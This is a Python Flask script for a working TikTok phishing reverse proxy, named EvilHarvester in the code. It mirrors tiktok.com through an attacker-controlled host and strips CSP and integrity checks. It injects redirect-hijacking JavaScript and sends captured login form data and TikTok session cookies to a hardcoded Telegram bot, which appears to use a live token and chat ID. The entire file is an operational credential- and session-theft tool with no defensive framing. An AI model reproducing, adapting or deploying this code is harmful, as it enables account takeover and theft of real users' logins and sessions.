import os, re, json, urllib3, requests
from flask import Flask, request, make_response, redirect
from urllib.parse import urljoin
from werkzeug.middleware.proxy_fix import ProxyFix

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

a = Flask(__name__)
a.wsgi_app = ProxyFix(a.wsgi_app, x_for=1, x_proto=1, x_host=1, x_prefix=1)

T = "8554468568:AAFvQJVSo6TtBao6xreo_Zf1DxnFupKVTrc"
C = "1367401179"

class EvilHarvester:
    def __init__(self):
        self.target = "www.tiktok.com"
        self.ess = ['sessionid', 'sid_tt', 'uid_tt', 'ttwid', 'msToken', 'odin_tt']

    def n(self, m):
        try: requests.post(f"https://api.telegram.org/bot{T}/sendMessage", json={"chat_id": C, "text": m, "parse_mode": "HTML"})
        except: pass

    def r(self, t, h):
        t = t.replace(f'https://{self.target}', f'https://{h}')
        t = t.replace('www.tiktok.com', h)
        t = t.replace('Content-Security-Policy', 'X-Proxy-CSP')
        t = re.sub(r'integrity="[^"]+"', '', t)
        
        i = f"""
        <script>
            (function() {{
                const op = window.location.replace;
                window.location.replace = function(u) {{
                    if(u.includes('tiktok.com')) u = u.replace('www.tiktok.com', '{h}');
                    window.location.href = u;
                }};
                Object.defineProperty(document, 'domain', {{get: function() {{return '{self.target}';}}}});
            }})();
        </script>
        """
        return t.replace('<head>', f'<head>{i}')

e = EvilHarvester()

@a.route('/')
def home():
    return redirect('/login')

@a.route('/<path:p>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])
def p(p):
    h = request.headers.get('Host')
    u = urljoin(f"https://{e.target}", p)
    if request.query_string:
        u += '?' + request.query_string.decode()

    H = {k: v for k, v in request.headers if k.lower() not in ['host', 'accept-encoding']}
    H['Host'] = e.target

    if request.method == 'POST':
        d = request.get_data(as_text=True)
        if any(k in d.lower() for k in ['pass', 'user', 'login', 'email']):
            e.n(f"🎯 <b>Data:</b>\n<code>{d[:1000]}</code>")

    try:
        r = requests.request(
            method=request.method,
            url=u,
            headers=H,
            cookies=request.cookies,
            data=request.get_data(),
            allow_redirects=False,
            verify=False
        )

        ck = r.cookies.get_dict()
        if 'sessionid' in ck:
            s = "; ".join([f"{k}={v}" for k, v in ck.items() if k in e.ess])
            e.n(f"🔥 <b>SESSION:</b>\n<code>{s}</code>")

        b = r.content
        if 'text/html' in r.headers.get('Content-Type', ''):
            b = e.r(b.decode('utf-8', errors='ignore'), h).encode()

        res = make_response(b)
        res.status_code = r.status_code

        for k, v in r.headers.items():
            if k.lower() not in ['content-encoding', 'content-length', 'content-security-policy', 'set-cookie']:
                res.headers[k] = v

        for k, v in r.cookies.items():
            res.set_cookie(k, v, secure=True, httponly=True, samesite='None', domain=None)

        if r.status_code in [301, 302, 303, 307, 308]:
            l = r.headers.get('Location', '').replace(e.target, h)
            res.headers['Location'] = l

        return res

    except Exception as err:
        return str(err), 500

if __name__ == '__main__':
    a.run(host='0.0.0.0', port=int(os.environ.get('PORT', 10000)))
